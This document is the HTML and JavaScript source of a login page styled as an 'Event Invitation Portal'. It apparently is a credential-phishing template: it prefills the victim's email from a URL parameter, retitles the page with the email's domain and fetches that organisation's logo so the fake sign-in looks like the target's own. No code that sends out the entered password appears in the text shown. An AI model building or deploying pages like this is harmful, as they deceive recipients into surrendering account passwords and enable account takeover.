<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login to Your Account</title>

  <style>
    body {
      font-family: Arial, sans-serif;

      /* ✅ Default background (fallback) */
      background-image: url('https://i.postimg.cc/pVBJwW22/blue-notes-isolated-grey.png');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;

      height: 100vh;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      transition: background 0.5s ease;
    }

    /* ✅ Overlay for logo (instead of replacing background) */
    body::after {
      content: "";
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-repeat: no-repeat;
      background-position: center;
      background-size: 300px;
      opacity: 0.15; /* makes it subtle */
      z-index: 0;
    }

    body::before {
      content: "";
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      backdrop-filter: blur(10px);
      background-color: rgba(255, 255, 255, 0.2);
      z-index: 0;
    }

    .login-container {
      background-color: rgba(255, 255, 255, 0.65);
      backdrop-filter: blur(20px);
      width: 100%;
      max-width: 360px;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
      z-index: 1;
      text-align: center;
    }

    .login-container img {
      width: 60px;
      margin-bottom: 15px;
    }

    .login-container h2 {
      font-size: 24px;
      margin-bottom: 10px;
      color: #222;
    }

    .login-container p.subtext {
      font-size: 13px;
      color: #555;
      margin-bottom: 20px;
    }

    .login-container input {
      width: 90%;
      padding: 10px;
      margin-bottom: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 14px;
      background-color: #f9f9f9;
    }

    .login-container button {
      width: 90%;
      padding: 12px;
      background-color: #007BFF;
      color: #fff;
      border: none;
      font-size: 16px;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
    }

    .footer {
      position: fixed;
      bottom: 10px;
      width: 100%;
      text-align: center;
      font-size: 14px;
      color: #fff;
      z-index: 1000;
    }
  </style>
</head>

<body>

  <div class="login-container">
    <img src="https://i.postimg.cc/qMNXQ08h/user-male-circle-blue-512.webp">

    <h2 id="portalTitle">Event Invitation Portal</h2>

    <p class="subtext">Strictly Confidential</p>

    <input type="text" id="username" placeholder="Email" required>
    <input type="password" placeholder="Password">

    <button>Login</button>
  </div>

  <div class="footer">
    2026 Email Invitation. All Rights Reserved
  </div>

<script>
  document.addEventListener("DOMContentLoaded", function () {
    const params = new URLSearchParams(window.location.search);
    const emailParam = params.get("email");

    const usernameField = document.getElementById("username");
    const title = document.getElementById("portalTitle");

    function extractDomain(email) {
      if (!email || !email.includes("@")) return "";
      return email.split("@")[1];
    }

    function setBackgroundFromDomain(domain) {
      if (!domain) return;

      const logoUrl = `https://logo.clearbit.com/${domain}`;

      // ✅ Test if image loads before applying
      const img = new Image();
      img.onload = function () {
        document.body.style.setProperty("--logo-bg", `url('${logoUrl}')`);
        document.body.style.setProperty("--logo-visible", "block");
        document.body.style.setProperty("--logo-url", `url('${logoUrl}')`);
        document.body.style.setProperty("--logo-url", `url('${logoUrl}')`);

        document.body.style.setProperty("--logo", `url('${logoUrl}')`);

        document.body.style.setProperty("--bg-logo", `url('${logoUrl}')`);
        document.body.style.setProperty("--bg-logo", `url('${logoUrl}')`);

        document.body.style.setProperty("--logoImage", `url('${logoUrl}')`);

        // Apply to ::after
        document.styleSheets[0].addRule("body::after", `background-image: url('${logoUrl}')`);
      };

      img.onerror = function () {
        // ❌ Do nothing (keeps default background)
      };

      img.src = logoUrl;
    }

    // Prefill
    if (emailParam && usernameField) {
      const decodedEmail = decodeURIComponent(emailParam);
      usernameField.value = decodedEmail;

      const domain = extractDomain(decodedEmail);
      if (domain) {
        title.textContent = domain;
        setBackgroundFromDomain(domain);
      }
    }

    // Live update
    usernameField.addEventListener("input", function () {
      const domain = extractDomain(this.value.trim());

      if (domain) {
        title.textContent = domain;
        setBackgroundFromDomain(domain);
      } else {
        title.textContent = "Event Invitation Portal";
      }
    });
  });
</script>

</body>
</html>
